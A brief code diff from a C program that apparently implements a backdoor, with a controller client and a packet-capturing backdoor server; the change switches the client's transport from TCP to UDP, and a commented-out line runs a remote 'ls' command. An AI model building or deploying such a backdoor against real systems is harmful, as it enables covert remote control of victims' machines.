@@ -89,7 +89,7 @@ int main(int argc, char *argv[]) {
 
 	if (client) { // Controller Client
 		// do something
-		backdoor_client(resolve(source), resolve(host), "tcp");
+		backdoor_client(resolve(source), resolve(host), "udp");
 	} else { // Backdoor Server
 		pcap_init(resolve(source), resolve(host), "./", 1);
 		//cmd_execute("ls", resolve(source), resolve(host));
